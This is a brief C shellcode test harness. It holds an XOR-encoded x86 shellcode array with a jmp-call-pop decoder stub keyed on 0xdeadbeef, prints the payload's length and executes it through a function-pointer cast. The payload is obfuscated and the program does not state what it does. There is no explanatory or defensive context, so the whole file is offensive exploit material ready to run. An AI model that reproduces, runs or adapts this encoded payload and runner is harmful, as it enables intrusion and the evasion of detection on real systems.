#include <stdio.h>
#include <string.h>

unsigned char shellcode[] = \
"\xeb\x20\x5e\xb8\xef\xbe\xad\xde\x31\xd2\x31\xff\xb1\x19\xbb\xef\xbe\xad\xde\x39\xfb\x74\xf7\x30\x1c\x16\x42\xc1\xeb\x08\xe2\xf3\xff\xe6\xe8\xdb\xff\xff\xff\xde\x7e\xfd\xb6\xc0\x91\xc1\xad\x87\x91\xcf\xb7\x81\x37\x4e\x8e\x66\x5c\xfe\x57\x0e\x0e\xa6\x13\x6f";



main()
{

	printf("Shellcode Length:  %d\n", strlen(shellcode));
	int (*ret)() = (int(*)())shellcode;
	ret();

}
